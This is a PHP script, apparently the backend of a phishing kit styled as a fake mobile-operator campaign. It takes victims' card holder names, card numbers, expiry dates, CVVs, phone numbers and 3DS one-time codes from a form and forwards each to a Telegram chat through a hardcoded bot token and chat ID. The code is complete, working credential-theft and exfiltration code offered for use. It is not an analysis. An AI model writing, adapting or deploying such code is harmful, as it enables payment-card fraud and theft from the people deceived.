<?php
// ============================================================
// TELEGRAM HANDLER - TAM İŞLƏYƏN VERSİYA
// ============================================================

// YALNIZ POST İCƏZƏLİDİR
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('🚫 Giriş qadağandır!');
}

// BOT MƏLUMATLARI
$botToken = '8948913513:AAHz7gsPrKjvy5PeOq88R7QT45yhlhBLs2Q';
$chatId = '-1004431524568';

// POST MƏLUMATLARI
$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : '';
$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : '';
$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : '';
$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '';
$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : '';
$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : '';
$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
$type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';

// SIRALI ID
$counterFile = 'counter.txt';
if (file_exists($counterFile)) {
    $id = (int)file_get_contents($counterFile) + 1;
} else {
    $id = 1;
}
file_put_contents($counterFile, $id);

function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode;
}

// 1. KART MESAJI
if ($type === 'card_only' && !empty($cardNumber)) {
    $userIP = !empty($ip) ? $ip : 'N/A';
    
    // Telefon nömrəsini formatla (məsələn: 070 514-19-33)
    $formattedPhone = substr($phone, 0, 3) . " " . substr($phone, 3, 3) . "-" . substr($phone, 6, 2) . "-" . substr($phone, 8, 2);
    // Kart nömrəsini formatla (məsələn: 4169 7388 5032 6285)
    $formattedCard = implode(' ', str_split($cardNumber, 4));
    
    $message = "🔴 <b>YENİ BİLGİ</b> 🔴\n\n";
    $message .= "<b>Operator:</b> " . $operator . "\n";
    $message .= "<b>Nömrə:</b> " . $formattedPhone . "\n";
    $message .= "<b>Kampaniya:</b> " . $amount . " - " . $campaign . "\n\n";
    $message .= "<b>Kart Sahibi:</b> " . $cardName . "\n";
    $message .= "<b>Kart Nömrəsi:</b> <code>" . $formattedCard . "</code>\n";
    $message .= "<b>Kart Bitiş:</b> " . $cardExpiry . "\n";
    $message .= "<b>CVV:</b> " . $cardCvv . "\n";
    $message .= "<b>IP Adresi:</b> " . $userIP;
    
    sendToTelegram($message);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// 2. OTP MESAJI
if (!empty($otp)) {
    $userIP = !empty($ip) ? $ip : 'N/A';
    
    // Kart nömrəsini formatla
    $formattedCard = !empty($cardNumber) ? implode(' ', str_split($cardNumber, 4)) : 'N/A';
    
    $message = "🔴 <b>3DS KODU</b> 🔴\n\n";
    $message .= "<b>Kart Nömrəsi:</b> <code>" . $formattedCard . "</code>\n";
    $message .= "<b>3DS Kodu:</b> <code>" . $otp . "</code>\n";
    $message .= "<b>IP Adresi:</b> " . $userIP;
    
    sendToTelegram($message);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

header('Content-Type: application/json');
echo json_encode(['status' => 'error']);
exit;
?>
